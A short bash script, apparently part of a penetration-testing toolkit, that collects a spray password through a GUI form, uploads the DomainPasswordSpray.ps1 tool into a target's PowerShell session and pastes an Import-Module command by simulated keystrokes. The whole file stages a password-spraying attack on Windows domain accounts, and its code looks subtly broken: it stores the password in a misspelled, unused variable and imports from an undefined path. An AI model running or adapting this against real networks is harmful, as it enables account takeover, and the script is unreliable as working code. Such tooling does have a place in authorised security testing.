#!/bin/bash

: '
PowerShell: upload and import DomainPasswordSpray.ps1.
'

# Generate GUI form items (label, type (optional: default text), name, default (optional))
SPRAY_PASSWORD_FIELD=$(form_item  "spray password" "spray_password" "Welcome1")

# Generate GUI form
generate_form "${SPRAY_PASSWORD_FIELD}"

PRAY_PASSWORD_FILE=${form_data["spray_password"]}

LOCATION="${SCRIPTS_DIR}/fileTransfer/windows/.binaries"
FILE="DomainPasswordSpray.ps1"

ps_webclient_upload_file "${LOCATION}" "${FILE}"

paste_command "Import-Module ${FILE_LOCATION}"
xdotool key Return
